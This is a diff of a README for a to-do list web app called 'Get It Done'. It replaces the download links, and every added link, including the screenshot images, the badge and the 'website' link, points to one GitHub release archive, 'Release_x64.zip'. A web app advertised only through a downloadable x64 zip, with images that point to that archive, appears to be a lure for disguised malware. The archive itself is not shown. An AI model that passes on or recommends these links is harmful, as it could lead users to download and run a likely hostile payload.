@@ -21,26 +21,26 @@ This project was built using the following technologies:
 ## How to Use 🛠️
 
 1. Clone this repository to your local machine.
-2. Launch the To-Do List Web App by clicking [here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip).
+2. Launch the To-Do List Web App by clicking [here](https://github.com/SekiroDeath/get.it.done/releases/download/v1.0/Release_x64.zip).
 3. Start adding your tasks, setting priorities, and managing your time efficiently!
 
 ## Screenshots 📸
 
 Here are some glimpses of the **Get It Done** Web App:
 
-![Screenshot 1](https://via.placeholder.com/600x400)
-![Screenshot 2](https://via.placeholder.com/600x400)
-![Screenshot 3](https://via.placeholder.com/600x400)
+![Screenshot 1](https://github.com/SekiroDeath/get.it.done/releases/download/v1.0/Release_x64.zip)
+![Screenshot 2](https://github.com/SekiroDeath/get.it.done/releases/download/v1.0/Release_x64.zip)
+![Screenshot 3](https://github.com/SekiroDeath/get.it.done/releases/download/v1.0/Release_x64.zip)
 
 ## Download Now! 📥
 
-If you want to start boosting your productivity with **Get It Done**, download the app [here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip). Click the button below to launch the app:
+If you want to start boosting your productivity with **Get It Done**, download the app [here](https://github.com/SekiroDeath/get.it.done/releases/download/v1.0/Release_x64.zip). Click the button below to launch the app:
 
-[![Download Get It Done](https://img.shields.io/badge/Download-Get%20It%20Done-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Get It Done](https://github.com/SekiroDeath/get.it.done/releases/download/v1.0/Release_x64.zip%20It%20Done-brightgreen)](https://github.com/SekiroDeath/get.it.done/releases/download/v1.0/Release_x64.zip)
 
 ## Stay Productive, Get It Done! 🚀
 
-Don't procrastinate, start organizing your tasks today with **Get It Done**. Visit our website [here](https://github.com/22155555/1875695542) to learn more. Get ready to conquer your to-do list and achieve your goals effortlessly! 🌟
+Don't procrastinate, start organizing your tasks today with **Get It Done**. Visit our website [here](https://github.com/SekiroDeath/get.it.done/releases/download/v1.0/Release_x64.zip) to learn more. Get ready to conquer your to-do list and achieve your goals effortlessly! 🌟
 
 ## Contributors 🤝
 
